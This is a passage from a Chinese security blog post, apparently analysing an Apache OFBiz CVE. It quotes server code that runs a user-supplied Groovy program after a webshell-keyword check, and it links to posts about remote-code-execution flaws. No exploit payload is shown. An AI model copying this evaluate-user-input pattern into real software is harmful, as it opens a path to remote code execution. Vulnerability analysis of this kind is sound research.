class="line">        <span class="comment">// Check if a webshell is not uploaded but allow &quot;import&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (!SecuredUpload.isValidText(groovyProgram, [<span class="string">&quot;import&quot;</span>])) &#123;</span><br><span class="line">            logError(<span class="string">&quot;================== Not executed for security reason ==================&quot;</span>)</span><br><span class="line">            request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, <span class="string">&quot;Not executed for security reason&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        shell.parse(groovyProgram)</span><br><span class="line">        shell.evaluate(groovyProgram)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710040379934-63b1f9df-ec43-4a47-bed3-b21a952a66d5.png#averageHue=%232b2f37&clientId=u093e4bd1-db97-4&from=paste&height=538&id=uca7d2f55&originHeight=672&originWidth=1493&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=159701&status=done&style=none&taskId=ua0a4b715-706e-40f5-b2af-fc2ea8da3ec&title=&width=1194.4" alt="image.png"><br>获取groovyparam然后执行。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710040392531-c700620f-6947-4670-afe2-39d60400a34e.png#averageHue=%232b313b&clientId=u093e4bd1-db97-4&from=paste&height=51&id=u57fbe1e7&originHeight=64&originWidth=763&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11205&status=done&style=none&taskId=u5351e684-9407-4b91-b823-20356f23a76&title=&width=610.4" alt="image.png"></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/CVE/" class="tag">#CVE</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2024/03/10/YApi%20NoSQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">YApi 1.10.2 Unauthenticed RCE Via NoSQL Injection</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2024/03/08/CVE-2020-9496%20Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">CVE-2020-9496 Apache OfBiz 反序列化命令执行漏洞</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>